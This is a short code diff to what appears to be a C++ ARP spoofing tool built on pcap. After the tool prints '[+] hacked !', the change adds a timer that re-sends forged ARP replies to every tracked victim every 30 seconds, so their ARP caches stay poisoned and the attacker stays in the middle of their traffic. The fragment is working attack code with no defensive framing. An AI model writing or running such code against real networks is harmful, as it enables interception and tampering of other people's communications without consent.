@@ -11,6 +11,7 @@
 #include "arphdr.h"
 #include <vector>
 #include <netinet/ip.h>
+#include <ctime>
 
 
 #pragma pack(push, 1)
@@ -124,7 +125,17 @@ int main(int argc, char* argv[]) {
     }
     puts("[+] hacked !");
 
+    time_t last = time(nullptr);
+
     while (true) {
+        time_t now = time(nullptr);
+
+        if (now - last >= 30) {
+            for (const auto& flow : flows)
+                sendArpPacket(pcap, flow.senderMac, myMac, ArpHdr::Reply, myMac, flow.targetIp, flow.senderMac, flow.senderIp);
+            last = now;
+        }
+
         struct pcap_pkthdr* header;
         const u_char* packet;
         int res = pcap_next_ex(pcap, &header, &packet);
